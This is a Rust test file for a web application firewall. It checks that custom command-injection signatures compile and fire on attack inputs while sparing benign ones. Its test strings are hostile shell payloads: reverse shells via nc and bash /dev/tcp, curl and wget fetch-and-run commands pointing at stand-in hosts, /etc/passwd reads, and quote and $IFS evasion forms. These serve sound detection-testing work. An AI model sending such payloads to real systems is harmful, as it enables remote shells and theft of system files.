//! Coverage-rule tests for the shell/OS-command-injection signatures
//! (9900207 raw-operator, 9900208 cmdLine-normalized) added to
//! `rules/custom/coverage.conf`. Confirms the rules COMPILE under RE2 and that
//! they fire on real command injection while leaving benign values clean.
//!
//! These assert SCORE, not the engine's own decision. The coverage signatures
//! contribute `tx.anomaly_score=+5` and carry `pass`; the verdict is made by
//! `apply_verdict` in the proxy, which is the only place the false-positive
//! classifier can weigh in. Asserting `>= DEFAULT_BLOCK_THRESHOLD` says the
//! thing that actually matters — this payload blocks at default settings — and
//! keeps saying it if the action vocabulary changes again.

mod common;

use std::path::Path;

use common::{eval, make_get_ctx, make_post_ctx};
use sentinel_core::context::Phase;
use sentinel_rules::RuleEngine;

/// `sentinel_core::config::default_threshold()` — the flat anomaly threshold a
/// site gets when it sets none. A single CRITICAL coverage match (+5) reaches
/// it, so one signature is still enough to stop an attack class CRS misses.
const DEFAULT_BLOCK_THRESHOLD: u32 = 5;

fn load_coverage_engine() -> RuleEngine {
    let manifest = Path::new(env!("CARGO_MANIFEST_DIR"));
    let path = manifest.join("../../rules/custom/coverage.conf");
    let source =
        std::fs::read_to_string(&path).unwrap_or_else(|e| panic!("read {}: {}", path.display(), e));
    let file = sentinel_rules::import_secrule_conf_dir(&source, path.parent())
        .unwrap_or_else(|e| panic!("import {}: {}", path.display(), e));
    let ruleset = sentinel_rules::compile(file)
        .unwrap_or_else(|e| panic!("compile {}: {}", path.display(), e));
    RuleEngine::new(ruleset)
}

fn blocked_query(engine: &RuleEngine, uri: &str) -> bool {
    let mut ctx = make_get_ctx(uri);
    eval(engine, &mut ctx, Phase::RequestBody);
    ctx.anomaly_score >= DEFAULT_BLOCK_THRESHOLD
}

fn blocked_body(engine: &RuleEngine, body: &str) -> bool {
    let mut ctx = make_post_ctx("http://example.com/submit", body);
    eval(engine, &mut ctx, Phase::RequestBody);
    ctx.anomaly_score >= DEFAULT_BLOCK_THRESHOLD
}

#[test]
fn coverage_conf_compiles() {
    // Panics on any RE2-incompatible regex; reaching here means all rules built.
    let _ = load_coverage_engine();
}

#[test]
fn command_injection_operator_forms_blocked() {
    let e = load_coverage_engine();
    // operator + command verb + shell continuation, query value (percent-encoded)
    assert!(
        blocked_query(&e, "http://x/p?id=1%3Bcat%20/etc/passwd"),
        "; cat /"
    );
    assert!(
        blocked_query(&e, "http://x/p?q=%24%28whoami%29"),
        "$(whoami)"
    );
    assert!(
        blocked_query(&e, "http://x/p?q=%60uname%20-a%60"),
        "`uname -a`"
    );
    assert!(
        blocked_body(&e, "name=x|nc -e /bin/sh 10.0.0.1 4444"),
        "|nc -e"
    );
    assert!(
        blocked_body(&e, "host=127.0.0.1&&curl http://evil/x|sh"),
        "curl http://"
    );
    // GoTestWAF shell-injection shapes: $IFS / getent / echo / set
    assert!(
        blocked_body(&e, "q=;wget http://some_host/sh311.sh"),
        ";wget url"
    );
    assert!(
        blocked_body(&e, "q=|getent+hosts+somehost.example.net&"),
        "|getent+"
    );
    assert!(
        blocked_body(&e, "q=;getent$IFS$9hosts$IFS$9x;echo$IFS$9$((3482*7301));"),
        "$IFS echo"
    );
    assert!(blocked_body(&e, "q=| set /a 3482*7301"), "| set /a");
}

#[test]
fn command_injection_obfuscated_forms_blocked() {
    let e = load_coverage_engine();
    // quote/backslash obfuscation normalized by t:cmdLine
    assert!(
        blocked_body(&e, "f=c\"a\"t /e''tc/passwd"),
        "quote-obfuscated cat"
    );
    assert!(blocked_body(&e, "cmd=/bin/sh -i"), "/bin/sh -i");
    // A flag after whitespace, and a redirect with none, are still commands.
    assert!(
        blocked_body(&e, "x=a; nc -e /bin/sh 10.0.0.1 4444"),
        "; nc -e"
    );
    assert!(
        blocked_query(&e, "http://x/p?f=a%3Bcat%3C/etc/passwd"),
        ";cat</etc/passwd"
    );
    assert!(
        blocked_body(&e, "x=bash -i >& /dev/tcp/1.2.3.4/9001 0>&1"),
        "bash -i"
    );
}

#[test]
fn benign_values_not_flagged_by_cmdi_rules() {
    let e = load_coverage_engine();
    // Prose / params that mention command-ish words but carry no injection shape.
    for uri in [
        "http://x/p?action=concatenate&report=sales",
        "http://x/p?category=music&sort=price",
        "http://x/p?path=/home/user/documents/report.pdf",
        "http://x/p?msg=please%20sleep%20well%20and%20call%20me",
        "http://x/p?q=how%20to%20install%20python%20on%20linux",
        // A verb immediately followed by `=` or `-` is a key or a word, not a
        // command (open-appsec real-traffic false positives, 2026-10-12).
        "http://x/ddm/activity/src=8421;type=invmedia;cat=fl0;ord=1",
        "http://x/p?url=https%3A%2F%2Fshop.example%2Fa%3B%20nc-sale",
        "http://x/p?tags=a%3Bcat%3Dshoes",
    ] {
        let mut ctx = make_get_ctx(uri);
        eval(&e, &mut ctx, Phase::RequestBody);
        // Assert NO signature matched, not merely that the engine did not
        // decide. Since the coverage rules stopped carrying `block`, the
        // decision is always Allow here, so checking it would pass vacuously
        // and stop guarding anything.
        assert!(
            ctx.rule_matches.is_empty(),
            "benign value falsely flagged: {uri} -> {:?}",
            ctx.rule_matches
        );
    }
}
